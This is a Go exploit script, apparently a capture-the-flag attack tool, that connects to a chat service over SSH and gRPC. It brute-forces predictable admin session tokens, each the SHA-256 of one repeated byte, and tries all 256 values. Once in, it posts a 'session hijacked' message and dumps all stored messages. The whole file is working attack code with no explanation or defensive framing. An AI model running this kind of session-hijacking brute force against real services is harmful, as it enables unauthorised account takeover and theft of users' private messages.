package main

import (
	"checker/pkg/client"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"gosship/pkg/database"
	"log"

	"golang.org/x/crypto/ssh"
)

const sessionTokenSize = 32

func generateSessionToken(val byte) string {
	token := make([]byte, sessionTokenSize)
	for i := 0; i < sessionTokenSize; i++ {
		token[i] = val
	}
	tokenHash := sha256.New()
	tokenHash.Write(token)
	return hex.EncodeToString(tokenHash.Sum(nil))
}

func run() error {
	_, signer, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return err
	}
	sshSigner, err := ssh.NewSignerFromSigner(signer)
	if err != nil {
		return err
	}

	sshClient, err := client.GetSSHClient(sshSigner)
	if err != nil {
		return err
	}
	defer sshClient.Close()

	rpcChannel, err := client.OpenRPCChannel(sshClient)
	if err != nil {
		return err
	}
	defer rpcChannel.Close()

	grpcConn, err := client.CreateNewGRPCClient(rpcChannel)
	if err != nil {
		return err
	}
	defer grpcConn.Close()

	adminClient := client.NewAdminClient(grpcConn)

	//_, err = adminClient.Auth()
	//if err != nil {
	//	return err
	//}

	for i := 0; i < 256; i++ {
		log.Printf("trying: %d", i)
		adminClient.SessionToken = generateSessionToken(byte(i))
		err := adminClient.SendMessageToRoom("default", ":clown: session hijacked :clown:")
		if err != nil {
			log.Println(err)
		} else {
			log.Println("We are in!!!!")
			log.Printf("session token: %s", adminClient.SessionToken)
			err = adminClient.DumpMessages(func(entry *database.MessageEntry) {
				fmt.Println(entry)
			})
			if err != nil {
				return err
			}
			break
		}
	}
	return nil
}

func main() {
	log.Println("starting")
	if err := run(); err != nil {
		log.Fatal(err)
	}
	log.Println("done")
}
